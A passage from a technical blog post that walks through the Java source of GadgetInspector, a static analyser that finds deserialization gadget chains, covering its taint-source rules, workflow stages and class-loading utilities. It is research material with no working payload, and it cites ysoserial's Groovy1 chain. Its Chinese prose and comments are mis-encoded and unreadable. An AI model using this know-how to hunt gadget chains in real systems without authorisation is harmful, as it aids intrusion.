class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…ï¼Œç”¨äºåˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">final</span> SerializableDecider serializableDecider = <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ finalize æ–¹æ³•åˆ™è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;finalize&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ï¼Œå’Œä¸Šé¢çš„ç±»ä¼¼ï¼ˆå¯ä»¥åˆå¹¶ï¼‰</span></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ‰€å±ç±»å®ç°äº† readObjectï¼Œåˆ™ä¼ å…¥çš„ ObjectInputStream å‚æ•°è¢«è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;readObject&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/io/ObjectInputStream;)V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†ç±»</span></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–ï¼Œä¸”æ˜¯å¦ä¸º InvocationHandler çš„å­ç±»</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/lang/reflect/InvocationHandler&quot;</span>))) &#123;</span><br><span class="line">                <span class="comment">// ä½¿ç”¨ä»£ç†æ—¶ï¼Œä»»ä½•æ‰©å±• InvocationHandler çš„ç±»éƒ½è¢«è®¤ä¸ºå—æ±¡æŸ“</span></span><br><span class="line">                MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(</span><br><span class="line">                        clazz, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ï¼Œå’Œä¸Šé¢çš„ç±»ä¼¼ï¼ˆå¯ä»¥åˆå¹¶ï¼‰</span></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects</span></span><br><span class="line">        <span class="comment">// into a HashMap.</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ hashCode æ–¹æ³•åˆ™è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„ï¼ˆæ³¨æ„æè¿°ç¬¦ï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()I&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ equals æ–¹æ³•åˆ™è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„ï¼ˆæ³¨æ„æè¿°ç¬¦ï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/lang/Object;)Z&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ï¼Œå’Œä¸Šé¢çš„ç±»ä¼¼ï¼ˆå¯ä»¥åˆå¹¶ï¼‰</span></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨æ¯”è¾ƒå™¨ä»£ç†ï¼Œå¯ä»¥è·³è½¬åˆ°ä»»ä½• groovy Closure çš„ call()/doCall() æ–¹æ³•ï¼Œæ‰€æœ‰çš„å‚æ•°éƒ½è¢«æ±¡æŸ“</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;groovy/lang/Closure&quot;</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">&quot;call&quot;</span>) || method.getName().equals(<span class="string">&quot;doCall&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SourceDiscovery sourceDiscovery = <span class="keyword">new</span> SimpleSourceDiscovery();</span><br><span class="line">        sourceDiscovery.discover();</span><br><span class="line">        sourceDiscovery.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-å·¥ä½œæµç¨‹"><a href="#0x03-å·¥ä½œæµç¨‹" class="headerlink" title="0x03 å·¥ä½œæµç¨‹"></a>0x03 å·¥ä½œæµç¨‹</h1><ol><li>å‡†å¤‡å·¥ä½œ<ul><li>é…ç½® log4j å‘æ§åˆ¶å°è¾“å‡ºæ—¥å¿—</li><li>é…ç½® config ä¸ºé»˜è®¤å€¼ jserialï¼ˆJava ååºåˆ—åŒ–ï¼‰</li><li>æ¥å—å‚æ•°ï¼š<code>--resume</code> ä¿ç•™ .dat æ–‡ä»¶ã€<code>--config</code> æŒ‡å®šåˆ†æç±»å‹</li><li>æ ¹æ®å‚æ•°è¯»å– war/jar åŒ…è·¯å¾„ï¼Œè¿”å› URLClassLoader</li><li>åˆå§‹åŒ–ç±»æšä¸¾åŠ è½½å™¨ ClassResourceEnumerator</li></ul></li><li>MethodDiscoveryï¼šç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯<ul><li>classes.datï¼šç±»åã€çˆ¶ç±»åã€ç±»æ¥å£åã€æ˜¯å¦ä¸ºæ¥å£ã€ç±»çš„æ‰€æœ‰å­—æ®µï¼ˆæˆå‘˜ï¼‰</li><li>methods.datï¼šç±»åã€æ–¹æ³•åã€æè¿°ç¬¦ã€æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</li><li>inheritanceMap.datï¼šç±»åã€çˆ¶ç±»/è¶…ç±»/æ¥å£ç±»ï¼ˆç›´æ¥/é—´æ¥çˆ¶ç±»ï¼‰</li></ul></li><li>PassthroughDiscoveryï¼šæ•°æ®æµä¿¡æ¯ï¼Œå³æ–¹æ³•å‚æ•°æ˜¯å¦èƒ½å¤Ÿå½±å“å…¶è¿”å›å€¼<ul><li>å¦‚æœå­˜åœ¨æ–¹æ³•å°†å‚æ•°ä¼ é€’ç»™è¢«è°ƒæ–¹æ³•æ—¶ï¼Œéœ€è¦å…ˆåˆ¤æ–­è¢«è°ƒæ–¹æ³•è¿”å›å€¼ä¸è¢«è°ƒæ–¹æ³•å‚æ•°çš„å…³ç³»ã€‚</li><li>passthrough.datï¼šç±»åã€æ–¹æ³•åã€æ–¹æ³•æè¿°ç¬¦ã€æ±¡ç‚¹å‚æ•°ç´¢å¼•</li></ul></li><li>CallGraphDiscoveryï¼šæ–¹æ³•è°ƒç”¨å…³ç³»ä¿¡æ¯<ul><li>callgraph.datï¼šæ–¹æ³•æ‰€å±ç±»åï¼Œæ–¹æ³•åï¼Œæ–¹æ³•æè¿°ç¬¦ï¼Œè¢«è°ƒæ–¹æ³•æ‰€å±ç±»åï¼Œè¢«è°ƒæ–¹æ³•åï¼Œè¢«è°ƒæ–¹æ³•æè¿°ï¼Œæ–¹æ³•å‚æ•°ç´¢å¼•ï¼Œæ–¹æ³•å‚æ•°å¯¹è±¡çš„å­—æ®µåç§°ï¼Œè¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•</li></ul></li><li>SourceDiscoveryï¼šæŸ¥æ‰¾æ±¡ç‚¹æº<ul><li>sources.datï¼šç±»åï¼Œæ–¹æ³•åï¼Œæè¿°ç¬¦ï¼Œå‚æ•°ç´¢å¼•</li></ul></li><li>GadgetChainDiscoveryï¼šé‡å†™ä¿¡æ¯ã€åˆ©ç”¨é“¾ä¿¡æ¯<ul><li>methodimpl.datï¼šç±»åï¼Œæ–¹æ³•åï¼Œæè¿°ç¬¦</li><li>gadget-chains.txtï¼šç±»å.æ–¹æ³•åæè¿°ç¬¦ (å‚æ•°ç´¢å¼•)</li></ul></li></ol><h2 id="1-Util"><a href="#1-Util" class="headerlink" title="1. Util"></a>1. Util</h2><p>æ ¹æ® java åŒ…è·¯å¾„åˆ—è¡¨è¿”å› URLClassLoaderï¼Œåç»­ç”¨äºè¯»å–ç›¸åº”çš„ java åŒ…ï¼ˆwarã€jarï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(Util.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ® war åŒ…è·¯å¾„åˆ—è¡¨ï¼Œæ„é€ å¹¶è¿”å› URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warPath åŒ…è·¯å¾„åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title">getWarClassLoader</span><span class="params">(Path warPath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸´æ—¶æ–‡ä»¶å¤¹</span></span><br><span class="line">        <span class="keyword">final</span> Path tmpDir = Files.createTempDirectory(<span class="string">&quot;exploded-war&quot;</span>);</span><br><span class="line">        <span class="comment">// Delete the temp directory at shutdown</span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                deleteDirectory(tmpDir);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error cleaning up temp directory &quot;</span> + tmpDir.toString(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¤åˆ¶åˆ°ä¸´æ—¶æ–‡ä»¶å¤¹</span></span><br><span class="line">        <span class="comment">// Extract to war to the temp directory</span></span><br><span class="line">        <span class="keyword">try</span> (JarInputStream jarInputStream = <span class="keyword">new</span> JarInputStream(Files.newInputStream(warPath))) &#123;</span><br><span class="line">            JarEntry jarEntry;</span><br><span class="line">            <span class="keyword">while</span> ((jarEntry = jarInputStream.getNextJarEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Path fullPath = tmpDir.resolve(jarEntry.getName());</span><br><span class="line">                <span class="keyword">if</span> (!jarEntry.isDirectory()) &#123;</span><br><span class="line">                    Path dirName = fullPath.getParent();</span><br><span class="line">                    <span class="keyword">if</span> (dirName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Parent of item is outside temp directory.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!Files.exists(dirName)) &#123;</span><br><span class="line">                        Files.createDirectories(dirName);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(fullPath)) &#123;</span><br><span class="line">                        copy(jarInputStream, outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å­˜å‚¨åŒ…è·¯å¾„</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        classPathUrls.add(tmpDir.resolve(<span class="string">&quot;WEB-INF/classes&quot;</span>).toUri().toURL());</span><br><span class="line">        Files.list(tmpDir.resolve(<span class="string">&quot;WEB-INF/lib&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                classPathUrls.add(p.toUri().toURL());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(classPathUrls.toArray(<span class="keyword">new</span> URL[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ® jar åŒ…è·¯å¾„åˆ—è¡¨ï¼Œæ„é€ å¹¶è¿”å› URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jarPaths åŒ…è·¯å¾„åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title">getJarClassLoader</span><span class="params">(Path... jarPaths)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// å­˜å‚¨åŒ…è·¯å¾„</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> ArrayList&lt;&gt;(jarPaths.length);</span><br><span class="line">        <span class="comment">// éå†åŒ…è·¯å¾„åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> (Path jarPath : jarPaths) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Files.exists(jarPath) || Files.isDirectory(jarPath)) &#123; <span class="comment">// æŸ¥æ‰¾æ–‡ä»¶</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Path \&quot;&quot;</span> + jarPath + <span class="string">&quot;\&quot; is not a path to a file.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            classPathUrls.add(jarPath.toUri().toURL()); <span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(classPathUrls.toArray(<span class="keyword">new</span> URL[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Recursively delete the directory root and all its contents</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> root Root directory to be deleted</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deleteDirectory</span><span class="params">(Path root)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Files.walkFileTree(root, <span class="keyword">new</span> SimpleFileVisitor&lt;Path&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> FileVisitResult <span class="title">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                Files.delete(file);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> FileVisitResult <span class="title">postVisitDirectory</span><span class="params">(Path dir, IOException exc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                Files.delete(dir);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Copy inputStream to outputStream. Neither stream is closed by this method.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(InputStream inputStream, OutputStream outputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = inputStream.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ClassResourceEnumerator"><a href="#2-ClassResourceEnumerator" class="headerlink" title="2. ClassResourceEnumerator"></a>2. ClassResourceEnumerator</h2><p>å®šä¹‰ç±»èµ„æºæ¥å£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">interface</span> <span class="title">ClassResource</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>; <span class="comment">// è¯»å–æ–‡ä»¶</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>;    <span class="comment">// æ–‡ä»¶å</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»èµ„æºå…·ä½“å®ç°ï¼š</p><ul><li><code>PathClassResource</code>ï¼šç›´æ¥ä»è·¯å¾„è¯»å–ç±»æ–‡ä»¶ï¼Œç”¨äºé€šè¿‡ JRT æ–‡ä»¶ç³»ç»Ÿè¯»å–è·¯å¾„ä¸‹çš„ç±»æ–‡ä»¶ï¼ˆè¿è¡Œæ—¶ï¼‰</li><li><code>ClassLoaderClassResource</code>ï¼šä½¿ç”¨å·²æœ‰çš„ ClassLoader è¯»å–ç±»æ–‡ä»¶</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»è·¯å¾„è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PathClassResource</span> <span class="keyword">implements</span> <span class="title">ClassResource</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Path path;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">PathClassResource</span><span class="params">(Path path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.path = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Files.newInputStream(path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> path.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ ClassLoader è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderClassResource</span> <span class="keyword">implements</span> <span class="title">ClassResource</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String resourceName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ClassLoaderClassResource</span><span class="params">(ClassLoader classLoader, String resourceName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.classLoader = classLoader;</span><br><span class="line">        <span class="keyword">this</span>.resourceName = resourceName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> 